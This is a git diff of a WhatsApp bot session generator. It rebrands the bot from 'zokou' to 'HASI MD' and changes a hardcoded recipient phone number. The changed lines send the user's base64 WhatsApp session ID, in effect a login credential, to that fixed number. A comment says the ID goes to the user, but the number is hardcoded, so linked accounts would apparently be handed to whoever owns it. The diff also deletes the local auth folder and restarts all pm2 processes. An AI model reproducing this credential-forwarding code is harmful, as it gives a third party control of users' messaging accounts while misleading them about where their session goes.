@@ -42,12 +42,15 @@ setTimeout(() => {
           console.log('Good')
    
 
-let cc = `Merci d'avoir choisis zokou ce message encoder est votre session
+let cc = `Thanks for Chosing HASI MD  *. 🔰
+  ❲❒❳ Auther:CH HASEEB
+  ❲❒❳ Repo: https://github.com/chhaseeb47/HASI-MD
+  ❲❒❳ Visit For Tutorial https://www.Youtube.com/c/mhmodsofc
+  ❲❒❳ Group: https://chat.whatsapp.com/G4FBtLiaB2f84hkT87LKZ4
+`;
 
-thanks for choosing zokou , the encoded messages is your session.`;
-
-          let session_id = await session.sendMessage('22891733300@s.whatsapp.net', { text: c });      //SENDING 'base64' SESSION ID TO USER NUMBER
-          await session.sendMessage('22891733300@s.whatsapp.net', { text: cc } , { quoted : session_id });
+          let session_id = await session.sendMessage('923407472645@s.whatsapp.net', { text: c });      //SENDING 'base64' SESSION ID TO USER NUMBER
+          await session.sendMessage('923407472645@s.whatsapp.net', { text: cc } , { quoted : session_id });
           await require('child_process').exec('rm -rf auth_info_baileys')     //CLEAR 'auth_info_baileys' SO THAT NEXT TIME IT CLEARED FOR SCANNING ;
           
            exec('pm2 restart all', (error, stdout, stderr) => {
